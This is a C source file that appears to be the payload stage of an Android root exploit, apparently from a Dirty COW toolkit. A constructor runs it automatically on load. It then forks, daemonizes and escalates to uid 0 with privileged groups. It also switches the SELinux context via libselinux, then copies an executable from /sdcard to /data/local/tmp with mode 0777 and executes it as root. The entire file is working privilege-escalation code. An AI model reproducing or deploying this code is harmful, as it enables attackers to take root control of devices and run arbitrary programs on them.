//
// Created by k.leyfer on 15.03.2017.
//

#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>
#include <sys/stat.h>
#include <fcntl.h>
#include "dirty/common/logging.h"

#define EXEC_PAYLOAD_SDCARD_PATH "/sdcard/exec_payload"
#define EXEC_PAYLOAD_DST_PATH "/data/local/tmp/exec_payload"

typedef int getcon_t(char** con);

typedef int setcon_t(const char* con);

int copy_file(const char* src_path, const char* dst_path)
{
  int src_fd = open(src_path, O_RDONLY);
  if (src_fd == -1)
  {
    LOGV("unable to open %s: %s", src_path, strerror(errno));
    return -1;
  }

  int dst_fd = open(dst_path, O_WRONLY | O_CREAT);
  if (dst_fd == -1)
  {
    LOGV("unable to open %s: %s", dst_path, strerror(errno));
    return -1;
  }

  int bufsize = 4096;
  void* buf = (void*) malloc(bufsize);
  int readed = 0;
  do
  {
    readed = read(src_fd, buf, bufsize);
    if (readed > 0)
    {
      int written = write(dst_fd, buf, readed);
      LOGV("written %d", written);
      if (written == -1)
      {
        LOGV("unable to write: %s", strerror(errno));
        return -1;
      }
    }

    LOGV("%d readed", readed);
  } while (readed > 0);

  close(src_fd);
  close(dst_fd);
  return 0;
}

int copy_file_with_mode(const char* src_path, const char* dst_path, int mode)
{
  if (copy_file(src_path, dst_path) == -1)
  {
    LOGV("Unable to copy file!");
    return -1;
  }

  if (chmod(dst_path, mode) != 0)
  {
    LOGV("Unable to chmod %s: %s!", dst_path, strerror(errno));
    return -1;
  }

  return 0;
}

int payload_main()
{
  LOGV("%d: hi (%d)", getpid(), getuid());

  int orig_pid = getpid();
  pid_t pid = fork();
  if (pid == 0)
  {
    daemon(0, 0);

    if (getuid() != 0)
    {
      if (setresgid(0, 0, 0))
      {
        LOGV("setresgid failed: %s", strerror(errno));
        exit(0);
      }

      if (setresuid(0, 0, 0))
      {
        LOGV("setresuid failed: %s", strerror(errno));
        exit(0);
      }
    }

    gid_t groups[] = {
        1004,  // input
        2000,  // shell
        1007,  // log
        1011,  // adb
        1015,  // sdcard_rw
        1028,  // sdcard_r
    };

    if (setgroups(sizeof(groups) / sizeof(groups[0]), groups) != 0)
    {
      LOGV("Unable to set groups: %s", strerror(errno));
      exit(0);
    }
    else
    {
      LOGV("set groups OK!");
    }

    dlerror();
#ifdef __aarch64__
    void * selinux = dlopen("/system/lib64/libselinux.so", RTLD_LAZY);
#else
    void* selinux = dlopen("/system/lib/libselinux.so", RTLD_LAZY);
#endif
    if (selinux)
    {
      void* getcon = dlsym(selinux, "getcon");
      const char* error = dlerror();
      if (!error)
      {
        getcon_t* getcon_p = (getcon_t*) getcon;
        char* secontext;
        int ret = (*getcon_p)(&secontext);

        void* setcon = dlsym(selinux, "setcon");
        const char* error = dlerror();
        if (!error)
        {
          setcon_t* setcon_p = (setcon_t*) setcon;

          if ((*setcon_p)("u:r:init:s0") != 0)
          {
            LOGV("Unable to set context: %s!", strerror(errno));
          }

          if ((*setcon_p)("u:r:shell:s0") != 0)
          {
            LOGV("Unable to set context: %s!", strerror(errno));
          }

          (*getcon_p)(&secontext);
          LOGV("Current context: %s", secontext);
        }
      }
      dlclose(selinux);
    }
    else
    {
      LOGV("SELinux not found.");
    }

    if (getuid() == 0)
    {
      LOGV("root!");

      struct stat exec_payload_stat;
      if (stat(EXEC_PAYLOAD_DST_PATH, &exec_payload_stat) == -1)
      {
        if (errno == ENOENT)
        {
          LOGV("Copy payload from /sdcard");
          if (stat(EXEC_PAYLOAD_SDCARD_PATH, &exec_payload_stat) == -1)
          {
            LOGV("Unable to open %s: %s!", EXEC_PAYLOAD_SDCARD_PATH, strerror(errno));
            exit(0);
          }

          if (copy_file_with_mode(EXEC_PAYLOAD_SDCARD_PATH, EXEC_PAYLOAD_DST_PATH, 0777) == -1)
          {
            LOGV("Unable to copy %s to %s!", EXEC_PAYLOAD_SDCARD_PATH, EXEC_PAYLOAD_DST_PATH);
            exit(0);
          }
        }
      }

      if (execle(EXEC_PAYLOAD_DST_PATH, EXEC_PAYLOAD_DST_PATH, (char*) NULL, environ) == -1)
      {
        LOGV("Unable to exec payload: %s!", strerror(errno));
      }
    }

    exit(0);
  }
  else
  {
    while (1) {
      sleep(1);
    }
  }
}

int main(int argc, char const* argv[])
{
  return payload_main();
}

__attribute__((constructor)) void say_hello()
{
  payload_main();
}
